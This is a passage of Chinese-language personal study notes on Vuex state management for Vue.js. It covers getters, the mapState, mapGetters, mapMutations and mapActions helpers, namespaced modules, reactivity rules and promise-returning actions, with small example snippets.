> 4. 模板中使用 store中state里面的数据
> <li> {{ $store.state.sum }} </li>


**注意：**
- 一般来讲 我们在组件内部只写dispatch到actions中的哪个处理函数
- 也不写太多的逻辑，太多的逻辑可以在actions里面来处理
<!-- 
  组件内部
  incrementOdd() {
    if(this.$store.state.num % 2) {
      this.$store.dispatch('incrementOdd', this.n)
    }
  }


  store的action对象的add
  incrementOdd(context, value) {
    if(context.state.sum % 2) {
      context.commit('incrementOdd', value)
    }
  }
 -->

- 在 mutations 里面不要写过多的逻辑 也不要写异步任务 比如ajax请求
- 也就是说 整个操作store中的数据的逻辑 
  - 1. 组件中 只写 dispatch指定哪个actions中的处理函数
  - 2. actions中的处理函数 可以负责写逻辑
  - 3. mutations中的函数 只写直接怎么操作数据


> 如果 actions 中不用太多的逻辑 或者理解成没有异步的任务的时候 我们可以直接
> 组件 --- > mutations
> this.$store.commit('mutation中定义好的函数', value)


> 技巧
- 一般actions中的函数名小写 mutations里面的函数名大写 这样的好处是在开发者工具中能够直观的看到

- actions看似没有用处 但是当业务逻辑一复杂 我们在actions里面定义逻辑 这里面的逻辑只有一套 很多组件公用这一套
- 如果复杂的逻辑放在组件自身 不方便复用

--------------------------

### Vuex Store中的 getters 配置项
- 这个配置项都没有出现在vuex的原理图里 就说明它不是一个必须的配置项
- 当state中的数据 组件在使用的时候并不是直接拿来用，而是state中的数据乘10加100后 组件里在使用 也就是说这个数据要经过很多逻辑的运算之后的结果

- 那在哪完成比较好？
- 组件？ 组件内完成之后该组件能使用 不适合复用
- vuex？对在vuex里面完成其它组件可以直接拿到 复杂逻辑后的数据 方便复用

> 作用：
- getters主要用来对state中的数据进行加工 方便组件调用加工后的数据起到复用的效果


> 像极了 data 和 computed 的关系

> 模板中如果得到 getters 中的数据
> $store.getters.变量


> getters的使用
- 跟计算属性一样定义一个变量 把这个变量写成函数
- 通过return来得到属性的值
- 参数：
   函数中能够获得 state 参数
<!-- 
  // 用于将state中的数据进行加工
  const getters = {

    // 给放大10呗的数据起个名字
    bigSum(state) {

      // 内部靠返回值决定值
      return state.sum * 10
    }
  }
 -->

--------------------------

### mapState, mapGetters
- 在 computed 中使用的方法

- 我们定义在vuex - store中的数据，如果要是想在模板中使用的时候前面都要加上 $store.state.sum, 当模板中要很多地方都要使用vuex中的数据的话 那可能就会写很多的重复的代码$store.state.

- 那有没有什么办法能够帮我们解决写$store.state这部分的代码呢？ vuex中给我们提供了很多类似的 创建模板代码的函数 

> mapState
- mapState就是帮助我们在模板中使用vuex中的数据的时候 可以不用再写 $store.state 的功能 或者说利用一个mapState函数生成多个精简过的属性名
<!-- 
  $store.state.sum   -- >   sum
 -->

- 要点：
- mapState() 生成的结果是一个对象类型
- mapState() 要放在计算属性 computed 中
<!-- 
  其实我们也可以自己使用computed来完成这个逻辑 只是这样做很麻烦 vuex 给我们提供了方法

  // 自己使用计算属性完成
  computed: {
    sum() {
      return this.$store.state.sum
    }
  }

  然后我们在模板中是不是可以直接使用 sum 了
 -->


> 1. 引入
- import {mapState} from 'vuex'


> 2. 在 computed 中使用 mapState() 函数
- 借助mapState生成计算属性，从state中读取数据

> 方式一： 对象写法
> mapState({
  计算属性名(变量名): 'vux中想要使用的数据',
  计算属性名(变量名): 'vux中想要使用的数据',
})  

- 注意：
- 这里不能因为我们想起的名字和state中的数据名一致 就使用es6的简写模式

- 计算属性名(变量名)就是我们要在模板中使用的变量 用来读取state中的数据

- 要点：
- mapState()本身就是一个对象 放在计算属性中的时候 要使用...来解构
- 使用这个方式本质也是利用了计算属性 也是使用了计算属性 但是优点就是mapState vue开发者工具能够观察到 是state中的数据
<!-- 
  computed: {

    // 要点在这 ...
    ...mapState({
      school: 'school',
      subject: 'subject',
    })
  }
 -->


> 方式二： 数组写法
- 从上面的例子我们能看见我们写了school: 'school', subject: 'subject',
- 在使用mapState()传递参数的时候 我们还可以传递一个数组进去

> mapState(['定义映射vuex数据的变量', 'vuex中的数据'])
- 也是使用...放在computed中
- 也是可以拿当中的变量 在模板中使用 本质也是计算属性
- 试验结果
- state定义的是num 组件里我也想起名叫做num
<!-- 
  computed: {
    ...mapState(["num"])
  }
 -->


> ...mapGetters({} || [])
- getters的用法跟上面的一样 也是两种写法
- 作用：
- 用于帮助我们映射getters中的数据为计算属性

--------------------------

### mapActions, mapMutations
- 在 methods 中使用的方法
- 使用方式几乎和上面的一样 也是通过 mapActions, mapMutations 来帮助我们生成重复性的代码
<!--  
  我们在使用commit向 mutations 中提交的时候都会在组件中对应的处理函数里写提交到Mutations的逻辑
  methods: {
    inc() {
      this.$store.commit('add', this.n)
    },

    dec() {
      this.$store.commit('dev', this.n)
    }
  }
  
  我们也是通过 mapMutations 帮助我们简写 向Mutations中提交代码
 -->

> 1. 引入
- import {mapMutations} from 'vuex'


> 方式1： 对象写法
> 方式2： 数组写法
> ...mapMutations({组件中的方法: 'mutations中对应的方法'})
- 我们是在 methods 中使用该方法
- 我们也要在 mapMutations 前面使用...

- 相当于我们在mapMutations中 找模板中的方法和mutations中的方式 做一一对应
<!-- 
  methods: {
    add() {
      this.$store.commit('add', this.n)
    },
    dec() {
      this.$store.commit('dec', this.n)
    },


    ...mapMutations({add: 'add', dec: 'dec'})
  }
 -->


> 3. 传递参数的时候 要在模板中传递
- 我们要想mutations提交的时候 需要传递数据 因为mutations要处理state中数据 需要我们提供数据 但是mapMutations并没有提供传递数据的位置 所以我们要在模板中调用处理函数的时候传入参数
<!-- 
  <li @click='add(n)'>+</li>
 -->


**注意：**
- 我们在使用上面一系列的方法的时候 最主要的是要跟vuex中的函数对应上以vuex中的函数为主

- 数组的写法多用在函数名一样的时候 函数名不一样的时候只能使用对象的写法


> ...mapActions({} || [])
- 方式和上面的mapMutations一样
- 也是在methods中使用 也要使用...

- 借助mapActions生成对应的方法 方法中会调用dispatch去联系actions

--------------------------

### modules配置项 -- vuex的模块化编码 
- 在上面的案例中 我们将state actions mutations getters都写在了一个indexjs文件里面 当每一个功能块中的逻辑越来越多的时候就不好管理了

- 我们的目标是actions mutations中的逻辑我们按照不同分类的将它们整理好
<!-- 
  // 求和功能相关的配置
  const countOptions = {
    actions: {},
    mutations: {},
    getters: {}
  }

  // 人员管理功能相关的配置
  const personsOptions = {
    actions: {},
    mutations: {},
    getters: {}
  }
 -->

- 上面完全形成了两套配置 也就是说写求和相关的程序员动第一套配置 写人员管理的程员动第二套配置

- 那 new Vuex_.Store({ ... }) 怎么写呢？
- 我们使用 modules 模块配置项

> 配置项： modules 
- 它的类型是一个对象 代码可以选择多组配置
- 使用该配置项后 store 中的配置开始按照我们的配置项分类了

> 在使用modules的时候 我们上面定义的每一个配置对象里面必须要加上一个
> namespaced: true  -- 开启命名空间 便于 mapState系列的方法识别
<!-- 
  // 求和功能相关的配置
  const countOptions = {
    namespaced: true      --- 这里
    actions: {},
    mutations: {},
    getters: {}
  }

  // 人员管理功能相关的配置
  const personsOptions = {
    namespaced: true      --- 这里
    actions: {},
    mutations: {},
    getters: {}
  }


  new Vuex.Store({
    modules: {
      a: countOptions,
      b: personsOptions
    }
  })

  它就像将store里面分成了两个配置
  store: {
    a: {
      actions,
      mutations,
      state
    },

    b: {
      actions,
      mutations,
      state
    }
  }
 -->



- 也就是说我们每一个actions mutations 里面都分为了a配置 和 b配置
<!-- 
  如果我们使用modules模块化 同时 我们组件里还使用mapMutations的方法
  那么我们应该这样

  ...mapState(['a', 'b'])

  模板上 我们在通过a b来读取对应配置中的对应数据
  {{a.sun}}
 -->

- 上面读store中的数据的时候 因为我们使用了modules对store中设置了两套配置所以我们在模板中使用的时候 是通过a(配置1).sum读取的

- 那有没有什么办法还是直接读取到数据呢？


> mapState('具体配置', [] || {})
- 要是使用两个参数那么每一个具体的配置项中必须包含 namespaced: true
- 然后mapState才会认识第一个参数
<!-- 
  computed: 

    ...mapState('a', ['sum', 'name'])
    - 意思就是我们从配置1中读取state中对应的数据
 --> 


> mapMutations('具体配置', [] || {})
- 当我们进行模块化编码的时候 我们有两套配置
- 那么我们在进行 dispatch 和 commit 的时候就要让vuex知道我们是往哪个配置中对应的函数中分发和处理 还是一一对应的关系 所以我们也要先指定具体的配置
<!-- 
  methods: {
    // handelInc() {
    //   this.$store.dispatch("inc", this.target)
    // }

    这样写就是直接发送到mutations里面
    ...mapMutations("a", {handelInc: "inc"}),
    ...mapMutations("b", {handelDec: "dec"})
  },
 -->


> 思考：
> 读取 state 中的数据等
- 如果没有使用mapState系列的时候 我们怎么在模板中调用


> $store.state.a.sum
- 其中a是modules中的一个配置
- 因为我们要告诉vue我们要找哪一个配置项中的属性 或 方法


- 如果没有使用mapState系列的时候 我们怎么在调用commit等方法？
> this.$store.commit('a/add', this.n)
- 其中a是modules中的一个配置
- 因为我们要告诉vue我们要找哪一个配置项中的属性 或 方法



> 读取 getters 中的数据等
- 我们在读取state中的数据的时候使用的是

> this.$store.state.a.sum
- a是modules里面的一个a分类

- 但是我们在读取getters中的数据的时候 不是像上面那么写的
- 这么写是不对的 this.$store.getters.a.sum 因为modules/getters里面并不是这么设计的
<!-- 
  当我们使用了modules的时候 我们的store是这样的结构
  state: {
    a:{sum: 0}
    b:{name: '张三'}
  }
  所以我们是通过 state.a.sum 的方式获取到的值
 -->

- 但是getters中的数据结构不是这样的 而是
<!-- 
  getters: {
    a/sum: 0,
    b/name: '张三'
  }
 -->

- 所以我们要在使用modules后 从中取到getters中的数据的时候要这么写 
> this.$store.getters[’a/sum‘]
- 读取getters中的属性的时候 从a配置中读



> 总结Vuex的使用方式：

- 基本使用：
- actions mutations state
- 我们将数据保存在state中 模板通过$store对象来调用

- 如果不设计异步操作的时候 我们可以在组件中直接commit到mutations里面

- 整个vuex的应用逻辑就是在找函数的一一对应 组件找actions中的函数 actions找mutations中的函数 函数名都是一一对应的

- actions中的函数参数 context 和 value
- mutations中的函数参数 state 和 value

- 使用map系列
- state getters 都是在computed中使用
- 在使用之前要先引入

- actions mutations都要在methods中使用
- 在使用之前除了引入外还要使用...

- 我们使用map系列就是可以直接获取值 和直接分发和提交到actions和mutations中

- 比如模板中定义了一个inc方法 我们使用mapActions的时候 直接点击就可以 内部自动完成dispatch的操作

- modules系列
- 我们在逻辑多的时候 可以分功能来设置actions等配置

- 那就说明store中有a b两套配置
- 注意： module中的名字好像必须另外其 不能使用es6语法都定义成incModule
<!-- 
  const modules = {
    a: incModule,
    b: decModule
  }
 -->

- 使用modules后 html结构中怎么读取
- 计算属性中 ...mapState(["a", "b"]) 
- html结构中通过a.num 的方式读取

- 或者
- ...mapState("a", ["num"])也是可以的吧


- actions 和 mutations 也一样 
- methods中
<!-- 
  ...mapMutations("a", {handelInc: "inc"}),
  ...mapMutations("b", {handelDec: "dec"})
 -->


- 这个部分自己试验后的完整代码
<!-- 
  // index js 文件
  import Vue from "vue"
  import Vuex from "vuex"

  Vue.use(Vuex)

  // const state = {
  //   num: 0
  // }

  // 单独
  /* const actions = {
    inc(context, value) {
      let {commit} = context
      commit("inc", value)
    }
  }

  const mutations = {
    inc(state, value) {
      state.num += value
    }
  } */

  const incModule = {
    namespaced: true,
    state: {
      num: 0,
    },
    actions: {
      inc(context, value) {
        let {commit} = context
        commit("inc", value)
      }
    },
    mutations: {
      inc(state, value) {
        state.num += value
      }
    }
  }

  const decModule = {
    namespaced: true,
    state: {
      num: 100
    },
    actions: {
      dec(context, value) {
        let {commit} = context
        commit("dec", value)
      }
    },
    mutations: {
      dec(state, value) {
        state.num -= value
      }
    }
  }


  const modules = {
    a: incModule,
    b: decModule
  }

  const store = new Vuex.Store({
    // state,
    modules
  })

  export default store


  // app文件
  <template>
    <div id='app'>
      <span>{{a.num}}</span> --- 
      <span>{{b.num}}</span>
      <button @click="handelInc(target)">add</button>
      <button @click="handelDec(target)">jian</button>
    </div>
  </template>

  <script>
  import {mapState} from "vuex"
  import {mapMutations} from "vuex"

  export default {
    name: 'App',
    data() {
      return {
        target: 10,
      }
    },
    created() {
      console.log("我是App组件")
    },
    methods: {
      // handelInc() {
      //   this.$store.dispatch("inc", this.target)
      // }

      ...mapMutations("a", {handelInc: "inc"}),
      ...mapMutations("b", {handelDec: "dec"})
    },
    computed: {
      // ...mapState(["num"])
      ...mapState(["a", "b"])
    },


  }
  </script>

  <style>
    #app {
      width:400px;
      height:400px;
      background-color: deepskyblue;
      padding: 20px;
    }
  </style>
 -->

--------------------------

### vuex-state单一状态树的理解

> Vuex中有5个比较核心的概念
>>> 1. state
- 保存共享状态也就是数据的地方 state最基本的使用
<!-- 
  state: {
    将状态直接放在这里
    counter: 1000
  }

  // 模板中这么使用
  $store.state.counter
 -->

> 单一状态树的概念
- Vuex提出使用单一状态树, 什么是单一状态树?
- 英文名字 Single Source of Truth, 也可以翻译成单一数据源
<!-- 
  我们用一个生活中的例子做一个简单的类比
  在国内我们有很多的信息需要被记录, 比如上学时的个人档案, 工作后的社保记录, 公积金记录, 结婚后的婚姻信息, 以及其他相关的户口 医疗 文凭 房产记录等

  这些信息被分散在很多地方进行管理, 有一天你需要办理某个业务时(比如入户某个城市) 你会发现你需要到各个对应的工作地点去打印 盖章各种资料信息, 最后到一个地方提交证明你的信息无误

  这种保存信息的方案, 不仅仅低效, 而且不方便管理, 以及日后的维护也是一个庞大的工作(需要大量的各个部门的人力来维护, 当然国家目前已经在完善我们的这个系统了)
 -->

- 上面的比喻和我们在应用开发中比较类似
- 如果你的状态信息是保存到多个store对象中的, 那么之后的管理和维护等等都会变得特别的困难
- 所以vuex也使用了单一状态树来管理应用层级的全部状态
- 单一状态树能够让我们最直接的方式找到某个状态的片段, 而且在之后的维护和调试过程中, 也可以非常的方便和管理和维护
<!-- 
  上面的意思是, 我们在之前的代码中 只是创建了一个store
  const store = new Vuex.Store({})

  其实还可以跟上面说的情况一样 我可以创建多个
  const store1 = new Vuex.Store({})
  const store2 = new Vuex.Store({})
  const store3 = new Vuex.Store({})

  但是vue不推荐我们这么做, 而是将所有的状态管理信息放在一个store里面 只要是用到store中东西, 只需要store中的东西 都跟这一个store要就可以 
 -->

------

>>> 2. getters
- getters中的方法的默认参数是 state
- getters中的方法的 还可以传入 getters 参数 代表本身对象
<!-- 
  getters: {
    calc(state, getters) { ... }
  }
 -->
- 
- getters中的方法名当做属性来使用

- 调用的时候
- $store.getter.方法名 

- 有时候 我们需要从store中获取一些state变异后的状态
- 类似于组件中的计算属性, 当数据必须经过一系列的变化的时候就需要用计算属性来实现了
<!-- 
  比如 如果我们只想直接使用 一个状态的时候 那么只需要通过$store.state.变量访问就可以

  但是如果我希望这个状态经过某些变化再返回回去 就需要用到getters了 比如返回counter的平方, 这时候就需要用到getters了
  state: {
    counter: 1000
  },
  getters: {
    定义方法 这里面的方法名当做属性来调用
  }
 -->

- 需求1:
- 比如 我现在要在页面上显示 counter 的平方
- 当然我们可以直接这么做, 但是像下面这样做太繁琐了, 而且在有多个页面需要使用的时候 又得是这么一长串
<!-- 
  <p>{{$store.state.counter * $store.state.counter}}</p>
 -->

- 我们可以这样 在getters 中定义方法
<!-- 
  getters: {

    // 默认参数是state
    powerCounter(state) {
      return state.counter * state.counter;
    }
  }

  // 调用
  <p>{{$store.getters.powerCounter}}</p>
 -->

>> 需求1, 2总结:
- 我们可以将vuex中的状态变量经过一系列的处理后等待组件调用, 通过getters对象
- getters对象中的方法 就跟计算属性一样


- 需求2: 
- 将vuex中的共享属性 students 展示到组件中, 要求展示年龄大于20岁的
- 我们可以在组件中定义计算属性, 然后做完处理后展示在组件的模板中, 但是有个问题, 当我其它的页面都需要展示这个结果, 同样的代码还要继续再写一遍
<!-- 
  // store 
  state: {
    counter:1000,
    students: [
      {id:1, name:'sam', age:28},
      {id:2, name:'erin', age:18},
      {id:3, name:'nn', age:8}
    ]
  }


  // 组件
  - 在组件中我们使用了 计算属性 来达成目的
  computed: {
    clac() {
      return this.$store.state.students.filter(item => {
        return item.age >= 18;
      })
    }
  }
 -->

- 所以我们可以在getters中处理好等其它组件来调用
<!-- 
  // store index.js
  getters: {
    calc(state) {
      return state.students.filter(item => item.age > 10);
    }
  }


  // 组件调用
  <p>{{$store.getters.calc[0].name}}</p>
 -->


- 需求3:
- 获取 vuex state 中的 students中的年龄大于10的学生 和 个数
<!-- 
  <p>{{$store.getters.calc}}</p>

  // 这样就能拿到个数了
  <p>{{$store.getters.calc.length}}</p>
-->

- 那如何将个数的需求 定义成一个getters中的方法呢?
- 比如通过这样的方式获得 <p>{{$store.getters.calcLength}}</p>
<!-- 
  我们可以这样
  getters: {
    powerCounter(state) {
      return state.counter * state.counter;
    },

    calc(state) {
      return state.students.filter(item => item.age > 10);
    },

    // 定义一个新的方法
    calcLength(state) {
      return state.students.filter(item => item.age > 10).length;
    }
  }

  上面的代码中都有return state.students.filter(item => item.age > 10)这么

  在 getters 对象中的方法中, 还有第二个参数 getters 就代表了 getters对象
  所以我们还可以这么写
  getters: {
    powerCounter(state) {
      return state.counter * state.counter;
    },

    calc(state) {
      return state.students.filter(item => item.age > 10);
    },


    // 通过getters拿到calc属性 得到它的length
    calcLength(state, getters) {
      return getters.calc.length;
    }
  }
 -->

>> 需求3总结:
- getters对象中的额方法的参数 除了state 还有 getters getters参数代表这个对象本身, 方便我们通过getters.的方法获取别的getters对象中的其它属性
  

- 需求4
- 我希望得到 state中students 年龄大于 age 的 这个age是别人在用getters的时候传递进来的
<!-- 
  getters: {
    calc(state) {
      return state.students.filter(item => item.age > 10);
    }
  }
  
  上面的 item.age > 10 是写死的 我希望别人在使用的时候 传递一个age过来做判断
  <p>{{$store.getters.calc(10)}}</p>

  // 但是 getters 中的方法的参数 只有固定的state getters 不接受传递其它的参数 我们里面传递(state, getters, age) 这种方式不行
  calc(state) {
      return state.students.filter(item => item.age > 10);
    }

  // 那怎么解决 我们返回一个函数
  test(state) {
    return function(age) {     // 我们在这里传递age形参
      return state.students.filter(item => item.age > age)
    }
  }

  // 因为 getters 的test属性 我们返回的是一个函数 函数可以加小括号调用 那么就可以传递参数
  <p>{{$store.getters.test(10)}}</p>

  // 实际例子中
  <p>{{$store.getters.calc(20)}}</p>
  <p>{{$store.getters.calc(20)[0].name}}</p>
 -->

------

>>> 3. mutation
- 上面我们简单的使用过mutations, vuex推荐我们当我们想改变vuex管理的状态变量的时候 提交到mutations对象中进行修改, 这样我们可以通过devtools观察到 状态变量什么时候被修改了 修改为什么了方便调试错误

- 其中 mutations对象中的方法的参数 有state 我们可以通过state.状态变量的形式访问state对象中的变量

- 也就是说只要想修改store中的state中的变量一定要通过mutations

> mutations的定义方式
<!-- 
  mutations: {
    increment(state) {
      state.counter++
    }
  }
 -->

> mutations的调用方式
- this.$store.commit() 方法提交到 mutations
<!-- 
  // 组件中定义方法 方法中提交到mutations
  increment() {
    this.$store.commit('事件类型')
      - 也就是 mutations中的对应方法名
  }
 -->

- 我们可以将 在mutations中定义的函数看做是两部分
<!-- 
  mutations: {
    increment(state) {
      state.counter++
    },

    decrement(state) {
      state.counter--
    }
  }
 -->

> mutations对象中 主要包括两个部分
- 1. 字符串的事件类型(type)
- 2. 回调函数, 该回调函数的第一个参数就是state
<!-- 
  上面的代码中
  increment          是事件类型
  (state){ ... }     是回调函数 回调参数第一个参数就是state 
 -->

> mutations对象中的传参
- 在通过mutation更新数据的时候, 有可能我们希望携带一些额外的参数

- 通过 $store.commint(参数1(事件类型), 参数2(传递参数))
- 接收 mutations中的回调中 参数2的位置是用来接收组件传递过来的参数的

- 这个组件传递到mutations中的参数还有个专业的名词 叫做 payload
- payload也可以是个对象, 当要传递的数据比较多的时候可以整理成一个对象

- vuex中的状态变量是通过mutations来修改的, 但是怎么修改 修改多少 有的时候我们需要在组件调用的时候传入
- 比如 下面的需求


> 需求1:
- 之前我们在页面上修改vuex中的变量都是+1 -1我现在希望+5 +10 也就是组件要告诉mutations怎么修改 修改多少
<!-- 
  // 组件中
  <button @click='addCount(5)'>按钮3</button>
    - 标签内部绑定事件, 并传入实参

  addCount(count) {
    this.$store.commit('incrementCount', count);
  }
    - 组件内对应的处理方法中使用commit提交到mutations对象的处理方法中
    - 参数1 事件类型
    - 参数2 我们想要传递到mutations中的参数

  
  // vuex中
  incrementCount(state, count) {
    state.counter += count
  }
    - 参数1 state对象
    - 参数2 组件传递过来的参数
 -->

> mutations的提交风格
- 上面我们讲了向mutations中的方法提交参数(payload)
<!-- 
  1. 普通的提交风格 之前的提交方式
  this.$store.commit('事件类型', payload)

  // 使用普通风格提交的参数
  mutations中的方法在获取count参数的时候, 直接是值



  2. 特殊的提交风格
  this.$store.commit({
    type: '事件类型 也就是mutations中对应的处理方法名',
    payload: count
  })

  // 使用特殊风格提交的参数
  mutations中的方法在获取count参数的时候,count是一个对象

  对象中包含:
  {
    type: '事件类型 也就是mutations中对应的处理方法名',
    count: count
  }

  我们要取值的时候就得是 定义一个payload形参接收组件传递过来的对象
  incrementCount(state, payload) {
      state.counter += payload.count
    }
 -->

--------------------------

### vuex(mutation) - 数据的响应式原理
- 也可以说mutation的响应规则
- vuex的store中的state是响应式的, 只要是写在state中的属性, 都会被假如响应式的系统里面, 当state的数据发生改变时, vue组件会自动更新

<!-- 
  state: {
    info: {
      name: 'sam',
      age: 18
    }
  }

  我们在vuex的仓库中定义了一个info, 这个info就是响应式的, 假如组件中通过mutations修改了info中的属性的时候, 其它使用了$store.state.info的属性也会跟着发生改变, 这个改变的原理是

  info中的每一个属性都对应dep, dep是一个观察的模式 会监听属性的变化 观察数据有没有变化, 一旦发生变化 它会看下有哪些地方是需要根据我们的数据变化去刷新界面的

  比如有两个组件引用了info, 那么dep就是一个数组, 数组中 [watcher, watcher]
  当info中的数据发生变化的情况下, 就会通知数组中的组件让它们也发生对应的变化

  info: {
      name: 'sam',    Dep -> watcher
      age: 18         Dep -> watcher
    }
-->


- 但是这个响应式是有一定的要求的 要求我们必须遵守一些vuex对应的规则

> state中的数据是响应式的前提
- 1. 提前在store中初始化好所需的属性
<!-- 
  比如 我们现在在state对象中定义了info
  state: {
    info: {
      name: 'sam',
      age: 18
    }
  }

  那么上面的info中的name age都是响应式的, 因为初始化的时候这个info就被添加到响应式的系统中

  但是 如果我们通过 mutations updateInfo往info中新添加了一个属性, 虽然info中是添加了一个属性, 但通过这种方式添加的属性, 并不会被加入响应式的系统时, 组件中不会实时更新address

  mutations: {
    updateInfo(state) {
      state.info['adress'] = '洛杉矶'
    }
  }

  但是有时候我们确定有这种需求, 期望我们新添加进去的属性, 是响应式的可以界面跟着一起刷新
 -->


- 2. 当给state中的对象添加新的属性的时候, 使用下面的方式 新添加的属性就会是响应式的
- 也就是说 我们使用常规的添加和删除的方式给state对象中添加属性 或者 删除属性并不是响应式的
<!-- 
  常规方法: 下面的常规方法 做不到响应式

  // 添加
  updateInfo(state) {
    state.info['adress'] = '洛杉矶'
  }

  // 删除
  updateInfo(state) {
    delete state.info.age
  }
 -->

  >> 方式1. 添加  
      - Vue.set(要修改的对象, '属性名', 属性值)

  >> 方式1. 删除  
      - Vue.delete(要删除的对象, '属性名')

  >> 方式2. 用新对象给旧对象重新赋值


<!-- 
    // 方式1
    mutations: {
      updateInfo(state) {
        Vue.set(state.info, 'address', '洛杉矶')
        Vue.delete(state.info, 'age')
      }
    }
 -->

--------------------------

### Mutations 常量类型
- 我们来考虑一下下面的问题
<!-- 
  在mutation中 我们定义了很多事件类型(也就是其中的方法名称) 当我们的项目增大时, vuex管理的状态越来越多, 需要更新状态的情况越来越多, 那么意味着mutation中的方法就越来越多 方法过多, 使用者需要花费大量的精力去记住这些方法, 甚至是多个文件间的来回切换, 查看方法名称 甚至如果不是复制的时候, 可能还会出现写错的情况 


  // vuex 
  mutations: {
    updateInfo(state) {
      Vue.set(state.info, 'address', '洛杉矶')
    }
  }

  // 组件中的方法
  this.$store.commit('updateInfo')

  我们要更改vuex中的状态, 就要通过mutations来进行处理, 但是当我们的项目越来越大mutations中的方法就会越来越多, 不仅需要去记mutations中的事件类型, 还要复制事件类型到组件的commit()中, 这个过程极有可能会出错

  vuex建议我们把 mutations中的方法名 放在一个专门放常量的文件中进行管理
  这样 mutations 中的方法名 和 组件中的commit都使用一个减小出错的概率
-->

> 具体步骤
- 1. 在store文件夹中, 创建一个mutations-type.js文件
<!--
  export const INCREMENT = 'increment'
-->

- 2. 分别在store文件夹里面的index.js中, 组件中分别引入并使用该常量
- [事件类型]() { ... } 使用[]
<!-- 
  // 组件
  import { INCREMENT } = from './路径'
  this.$store.commit(INCREMENT)


  // vuex
  import { INCREMENT } = from './路径'
  [INCREMENT](state) {
    Vue.set(state.info, 'address', '洛杉矶')
  }
 -->

--------------------------

### vuex - actions使用详解

> Mutations 同步函数
- 通常情况下, vuex要求我们mutations中的方法必须是同步方法
  - 主要的原因是我们使用devtools时, devtools可以帮助我们捕捉mutation的快照
  - 但是如果是异步操作, 那么devtools将不能很好的追踪这个操作什么时候会被完成
<!-- 
  mutations: {
    updateInfo(state) {

      // 同步的话, devtools 能很好的捕捉到快照
      Vue.set(state.info, 'address', '洛杉矶')


      // 在mutations中使用异步的时候 devtools 不能捕捉到快照
      setTimeout(() => {
        Vue.set(state.info, 'address', '洛杉矶')
      }, 1000)
    }
  }

  如果是调试程序的时候 视图确实已经被修改, 但是devtools还是之前的值 不起效果了
  devtools跟踪不到 相当于里面记录错误的信息
 -->

- 如果确实需要在vuex中进行一些异步操作, 比如网络请求 那么我们就添加一个环节, 在actions中定义一个方法 方法内部写上异步操作, 然后由actions提交到mutations, 由mutations来进行修改, 当然组件中也是由使用commit提交到mutations改为使用dispatch提交到actions

> actions
- actions 里面也是一些的方法
- actions 中的方法的默认形参是 context(上下文)
<!-- 
  这里我们把 形参 context 理解为 store 对象 (const store = new Vuex.Store())

  既然context是store对象, 那么store中就会有commit方法, 用户将actions中的操作提交到mutations进行修改
 -->

> 完整的步骤
- 1. 在组件中异步修改vuex store中的状态变量
- 要点:
- 使用 $store.dispatch 将点击操作 提交到 actions 中处理
<!-- 
  <button @click='updateInfo'>点击按钮修改信息</button>
  updateInfo() {
    this.$store.dispatch('aUpdateInfo');
  }
 -->

- 2. 在action中定义异步操作, 将异步操作 提交到mutations中进行处理
- 要点:
- actions中的方法的参数 是context 可以理解为 store对象
- 使用context.commit() 提交到mutations中的处理函数
<!-- 
  actions: {
    aUpdateInfo(context) {
      setTimeout(() => {
        context.commit('updateInfo')
      }, 1000)
    }
  }
 -->

- 3. 最终在mutation中修改vuex管理的状态变量
<!-- 
  mutations: {
    updateInfo(state) {
      state.info.name = 'nn'
    }
  }
 -->


> 组件 和 action 之间传递参数
- 组件中可以在 dispatch() 中传递参数
- 在action中的方法的第二个形参中接收
<!-- 
  // 组件
  updateInfo() {
    this.$store.dispatch('aUpdateInfo', '我是payload参数');
  }

  // actions
  actions: {
    aUpdateInfo(context, payload) {   // 这来接收组件传递的参数
      setTimeout(() => {
        console.log(payload)
        context.commit('updateInfo')
      }, 1000)
    }
  }
 -->

- 需求:
- 我希望当action中修改成功后能够通知组件修改完成
- 什么时候修改成功呢? actions中使用 context.commit的时候就是成功了, 所在在context.commit()的下面继续写代码就可以了 如果失败就不会执行到 commit下面的代码

- 我们可以在组件的 dispatch() 的第二个参数组织成一个对象
<!-- 
  // 组件
  updateInfo() {

      // 我们将第二个参数整理成对象 里面放参数 和 回调
      this.$store.dispatch('aUpdateInfo', {
        message: '我是参数',
        success: () => {
          console.log('里面已经完成了')
        }
      });
    }


  // actions
  actions: {
    aUpdateInfo(context, payload) {
      setTimeout(() => {

        // 什么时候代表成功 只要commit就会成功 如果不成功就会报错 不会执行到下面
        context.commit('updateInfo')

        // 那就是说? 先mutation里面修改完 然后回调?成功之后的逻辑可以放在这里
        console.log(payload.message);
        payload.success();
        
      }, 1000)
    }
  }
 -->

- 另一种优雅的做法
- 需求还是跟上面的一样 我希望当action提交mutation修改完成后 通知组件里面逻辑已经完成
- 这里我们使用promise
<!-- 
  // actions
  
  actions: {
    aUpdateInfo(context, payload) {

      // 这里 我直接return出去一个 promise 就意味着 组件里接收的也是一个promise对象 可以调用then的方法
      return new Promise((resolve, reject) => {
        setTimeout(() => {

          context.commit('updateInfo')
          console.log(payload);
          
          // 这里还可以传递参数到组件
          resolve('1111');

        }, 1000)
      })
    }
  }


  // 组件
  // 组件中调用then方法
  updateInfo() {
    this.$store
    .dispatch('aUpdateInfo', '我是组件传递过去的信息')
    .then(res => {
      console.log('里面完成里提交')

      // 打印actions传递过来的参数
      console.log(res)    // 1111
    });
  }
 -->

- 优点 不仅组件可以向actions里面传递参数, actions中还可以向组件里传递参数
- 为什么可以在组件中使用then方法?
- action中 aUpdateInfo 方法 整体的 return了  new Promise对象
- vuex是这样做的 组件中 谁调用了 dispatch('aUpdateInfo') 指向了action中的方法, 那么 promise对象相当于 返回到了组件中
<!-- 
  aUpdateInfo(context, payload) { return new Promise }

  组件使用dispatch到了aUpdateInfo
  this.$store
    .dispatch('aUpdateInfo', '我是组件传递过去的信息')

  那么 return new Promise 可以理解为 替换到 this.$store.dispatch('aUpdateInfo', '我是组件传递过去的信息') 这个位置

  那就意味着 promise 返回到组件中了
 -->

- 弹幕说 dispatch 返回的本来就是promise对象

--------------------------

### vuex - modules的使用详解
- 上面讲了 state mutation actions getters 还有一个modules, 我们是把所有的状态变量都放在了state中去管理, 但是如果项目越来越大 state 中的变量就会越来越多, 那么就会越来越臃肿

- vuex建议我们使用单一状态树, 那么就意味着很多状态都会交给vuex来管理
- 当应用变得非常复杂的时候, store对象就有可能变得相当的臃肿
- 为了解决这个问题, vuex允许我们将store分割成模块(modules), 而每个模块拥有自己的state mutation actions getter等

<!-- 
  modules: {
    // 定义个模块A
    a: {
      state: {}
      mutations: {}
      actions: {}
      getters: {}
    }

    // 定义个模块b
    b: {
      state: {}
      mutations: {}
      actions: {}
